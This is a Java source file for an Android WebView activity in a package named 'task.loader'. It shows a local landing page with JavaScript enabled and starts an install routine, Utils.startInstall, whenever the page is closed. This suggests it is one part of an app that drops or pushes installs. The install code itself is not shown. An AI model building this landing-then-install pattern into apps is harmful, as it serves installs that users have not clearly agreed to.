package task.loader;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class WebActivity extends Activity
{
    private static WebActivity instance;

    public static WebActivity getInstance()
    {
        return instance;
    }

    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        instance = this;
        super.onCreate(savedInstanceState);

        if(Constants.DEBUG) Settings.debug("WebActivity::onCreate()");

        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);

        webView.setWebViewClient(new WebViewClient()
        {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url)
            {
                if(Constants.DEBUG) Settings.debug("WebActivity::shouldOverrideUrlLoading() url: " + url);
                if (url != null && url.equalsIgnoreCase("internal://close"))
                {
                    finish();
                    return true;
                }

                return false;
            }
        });

        String html = Utils.getFileContent(Utils.getLangingFile(this));
        if(Constants.DEBUG) Settings.debug("html: " + html);

        if(html != null && html.length() > 0)
        {
            setTitle(Utils.parseTitle(html));
            webView.loadData(html, "text/html", "utf-8");
            setContentView(webView);
        }else{
            finish();
        }
    }

    @Override
    protected void onDestroy()
    {
        super.onDestroy();

        Utils.startInstall(this);
    }

    public static void show(Context context)
    {
        if(Constants.DEBUG) Settings.debug("WebActivity::show()");

        Intent intent = new Intent(context, WebActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        context.startActivity(intent);
    }
}
